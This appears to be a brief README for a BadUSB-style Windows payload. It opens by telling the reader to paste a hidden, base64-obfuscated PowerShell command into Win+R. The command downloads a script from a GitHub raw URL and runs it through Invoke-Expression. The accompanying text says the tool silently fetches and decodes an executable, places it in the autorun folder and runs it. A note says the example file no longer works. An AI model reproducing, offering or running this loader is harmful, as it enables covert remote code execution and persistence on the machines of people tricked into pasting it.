DO THIS ON YOUR PC:

1) COPY THIS: 

```powershell.exe -windowstyle hidden Invoke-Expression([Text.Encoding]::Utf8.GetString([Convert]::FromBase64String('KEludm9rZS13ZWJyZXF1ZXN0IC1VUkkgImh0dHBzOi8vcmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbS9hbGV4LVgtMTIvQXRvbWl4LWZ1emUvbWFpbi9jbWQudHh0IikuQ29udGVudA==')))```

or: ```powershell.exe -windowstyle hidden Invoke-Expression(Invoke-webrequest -URI "https://raw.githubusercontent.com/alex-X-12/Atomix-fuze/main/cmd.txt").Content```

2) HOLD WIN+R
3) HOLD CTR+V
4) PRESS ENTER!


cuh

the acual idea of this thing is to download a file and run it sliently 
designed to work with badusb
os: win 10

file gets encoded into base64 format and then powershell downloads in and converts back to exe, puts into autorun folder and runs.
this operation takes a lot of time but it worked for me when i used this in my puposes

update: file in example does not work already (just info)
